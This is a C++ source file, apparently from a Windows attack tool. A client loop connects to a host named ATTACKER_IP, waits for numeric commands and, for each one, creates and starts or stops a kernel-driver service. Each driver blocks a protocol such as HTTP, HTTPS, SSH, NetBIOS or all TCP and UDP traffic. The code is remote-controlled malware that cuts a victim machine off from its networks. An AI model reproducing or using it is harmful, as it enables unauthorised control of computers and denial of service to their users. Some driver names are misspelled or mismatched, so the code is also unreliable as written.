#include"main.h"
using namespace std;
class CService 
{

public:

	DWORD ServiceStart(const char*);
	DWORD ServiceStop(const char*);
	
	
	

};

DWORD CService::ServiceStart(const char* drivername)
{

	
	
	char dirpath[512] = { 0, };
	CStringA path;
	CString pathW;
	SC_HANDLE manager = ::OpenSCManager(
		NULL,
		NULL,
		SC_MANAGER_ALL_ACCESS
	);
	


	//GetCurrentDirectoryA(512, dirpath);

	path.Format("c:\\windows\\%s.sys",drivername);

	cout << "loading" << path << endl;

	SC_HANDLE srname = CreateServiceA(
		manager,
		drivername,
		drivername,
		SERVICE_ALL_ACCESS,
		SERVICE_KERNEL_DRIVER,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL,
		path.GetString(),
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);
	
	if (!srname)
	{

		if (GetLastError() == ERROR_SERVICE_EXISTS) 
		{

			srname = OpenServiceA(
				manager,
				drivername,
				SERVICE_ALL_ACCESS
			);
			if (!srname)
			{
				CloseHandle(manager);
				return GetLastError();
			}

		}
		else
		{
			CloseServiceHandle(manager);
		}
	}
	
	if (srname)
	{
		if (0 == StartService(srname, 0, NULL))
		{

			if (ERROR_SERVICE_ALREADY_RUNNING == GetLastError())
			{
				cout << "The Service is already started\n" << endl;
			}
			else 
			{
				CloseServiceHandle(manager);
				CloseServiceHandle(srname);
				return GetLastError();
			}
		}
		CloseServiceHandle(manager);
		CloseServiceHandle(srname);
	}
	return 0;

}
DWORD CService::ServiceStop(const char* drivername) 
{
	
	SC_HANDLE manager = NULL;
	SC_HANDLE srname = NULL;
	manager = OpenSCManagerA(
		NULL,
		NULL,
		SC_MANAGER_ALL_ACCESS
	);
	if (NULL == manager) 
	{
		cout << GetLastError() << endl;
		cout << "ServiceStop : " <<"OpenSCManagerA"<<endl;
		return GetLastError();
	}
	
	srname = OpenServiceA(
		manager,
		drivername,
		SERVICE_ALL_ACCESS
	);

	if (srname == NULL) 
	{
		cout << GetLastError() << endl;
		CloseServiceHandle(manager);
		cout << "ServiceStop : "<<"OpenServiceA" << endl;
		return GetLastError();
	}
	
	SERVICE_STATUS status;

	bool Query = QueryServiceStatus(srname, &status);
	if (Query == NULL) 
	{
		CloseServiceHandle(manager);
		CloseServiceHandle(srname);
		cout << "ServiceStop : " << "QuerySerfviceStatus" << endl;
		return GetLastError();
	}

	if (status.dwCurrentState != SERVICE_STOPPED) 
	{

		bool control = ::ControlService(
			srname,
			SERVICE_CONTROL_STOP,
			&status
		);
		if (!control) 
		{
			CloseServiceHandle(srname);
			CloseServiceHandle(manager);
			return GetLastError();
		}
		Sleep(2000);
	}
	CloseServiceHandle(srname);
	CloseServiceHandle(manager);

	return 0;
	
}


void DriverService() 
{
	CService service;

	SOCKET ssock;
	WSAEVENT sevent = WSACreateEvent();
	SOCKADDR_IN saddr = { 0, };
	ssock = socket(AF_INET, SOCK_STREAM, 0);
	WSAEventSelect(ssock, sevent, FD_CONNECT);
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = inet_addr(ATTACKER_IP);
	saddr.sin_port = htons(DRIVER_SIGNAL);
	
	
	while(connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr)) == SOCKET_ERROR)
	{

		if (WSAGetLastError() == WSAEISCONN)
			break;

		Sleep(1000);

	}

	while (1) {



		DWORD dwret = MsgWaitForMultipleObjects(1, &sevent, FALSE, INFINITE, QS_POSTMESSAGE);
		if (dwret == WAIT_FAILED)
		{

		}
		if (dwret == WAIT_OBJECT_0 + 1)
			break;

		WSANETWORKEVENTS ne = { 0, };
		WSAEnumNetworkEvents(ssock, sevent, &ne);
		
		if (ne.lNetworkEvents & FD_CONNECT) 
		{
			if (ne.iErrorCode[FD_CONNECT_BIT])
				goto $connect;
			sevent = WSACreateEvent();

			WSAEventSelect(ssock, sevent, FD_READ | FD_CLOSE);
			continue;
		}
		
		if (ne.lNetworkEvents & FD_READ) {

			if (ne.iErrorCode[FD_READ_BIT])
				goto $connect;

			int sel = 0;
			if (recv(ssock, (char*)&sel, 4, 0) == SOCKET_ERROR)
				goto $connect;

			if (FTP_CONNECT_BLOCK_START == sel)
				service.ServiceStart("ftpconnect_block");

			else if (FTP_DATA_BLOCK_START == sel)
				service.ServiceStart("ftpconnect_block");

			else if (HTTP_BLOCK_START == sel)
				service.ServiceStart("http_block");

			else if (HTTPS_BLOCK_START == sel)
				service.ServiceStart("https_block");

			else if (IMAP_BLOCK_START == sel)
				service.ServiceStart("imap_block");

			else if (NETBIOS_BLOCK_START == sel)
				service.ServiceStart("netbios_block");

			else if (REMOTETERMINAL_BLOCK_START == sel)
				service.ServiceStart("remoteterminal_block");

			else if (SNMP_BLOCK_START == sel)
				service.ServiceStart("snmp_block");

			else if (SSH_BLOCK_START == sel)
				service.ServiceStart("ssh_block");

			else if (TCP_ALL_BLOCK_START == sel)
				service.ServiceStart("tcp_all_block");

			else if (UDP_ALL_BLOCK_START == sel)
				service.ServiceStart("udp_all_block");

			else if (FTP_CONNECT_BLOCK_STOP == sel)
				service.ServiceStop("ftpconnect_block");
			else if (FTP_DATA_BLOCK_STOP == sel)
				service.ServiceStop("ftpdata_block");
			else if (HTTP_BLOCK_STOP == sel)
				service.ServiceStop("http_block");
			else if (HTTPS_BLOCK_STOP == sel)
				service.ServiceStop("https_block");
			else if (IMAP_BLOCK_STOP == sel)
				service.ServiceStop("imap_block");
			else if (NETBIOS_BLOCK_STOP == sel)
				service.ServiceStop("netbios_block");
			else if (REMOTETERMINAL_BLOCK_STOP == sel)
				service.ServiceStop("remoteterminal_block");
			else if (SNMP_BLOCK_STOP == sel)
				service.ServiceStop("snmp_blcok");
			else if (SSH_BLOCK_STOP == sel)
				service.ServiceStop("ssh_block");
			else if (TCP_ALL_BLOCK_STOP == sel)
				service.ServiceStop("tcp_all_block");
			else if (UDP_ALL_BLOCK_STOP == sel)
				service.ServiceStop("udp_all_block");

			continue;
		}

		if (ne.lNetworkEvents & FD_CLOSE) 
		{
		$connect:

			if (ssock)
				closesocket(ssock);
			if (sevent)
				CloseHandle(sevent);

			sevent = WSACreateEvent();
			ssock = socket(AF_INET, SOCK_STREAM, 0);
			WSAEventSelect(ssock, sevent, FD_CONNECT);

			while (connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr)) == SOCKET_ERROR)
			{
				if (WSAGetLastError() == WSAEISCONN)
					break;

				Sleep(1000);
			}


		}

	}

}